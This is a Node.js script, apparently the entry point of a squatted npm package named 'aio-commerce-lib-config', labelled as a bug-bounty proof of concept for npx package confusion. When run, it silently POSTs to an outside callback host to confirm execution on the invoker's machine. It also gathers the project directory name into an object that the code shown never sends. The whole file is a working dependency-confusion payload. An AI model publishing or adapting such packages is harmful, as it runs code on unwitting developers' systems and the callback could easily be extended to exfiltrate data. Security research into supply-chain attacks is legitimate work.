#!/usr/bin/env node

// SECURITY RESEARCH: Harmless npx confusion PoC.
// This package sends a simple "ping" to verify execution.
// No system data, source code, or PII is accessed or transmitted.
// Contact: dd_06@intigriti.me

const http  = require('http');
const https = require('https');
const path  = require('path');

// INIT_CWD is set by npm to the directory where npx was invoked from.
const targetDir       = process.env.INIT_CWD || process.cwd();
const safeProjectName = path.basename(targetDir);

const info = {
    pkg:       "aio-commerce-lib-config",
    timestamp: new Date().toISOString(),
    transport: 'http (npx)',
    project:   safeProjectName,
};

const CALLBACK_URL = "https://deepbounty.dd06-dev.fr/cb/d2545461-5256-4048-8ee1-8c9c3e8c3227";

function sendPing() {
    const parsed   = new URL(CALLBACK_URL);
    const postData = JSON.stringify({status: "ok"});
    const lib      = parsed.protocol === 'https:' ? https : http;

    const req = lib.request(CALLBACK_URL, {
        method: 'POST',
        headers: {
            'Content-Type':   'application/json',
            'Content-Length': Buffer.byteLength(postData),
        },
        timeout: 15000,
    }, (res) => { res.on('data', () => {}); });

    req.on('error', () => {});
    req.write(postData);
    req.end();
}

sendPing();
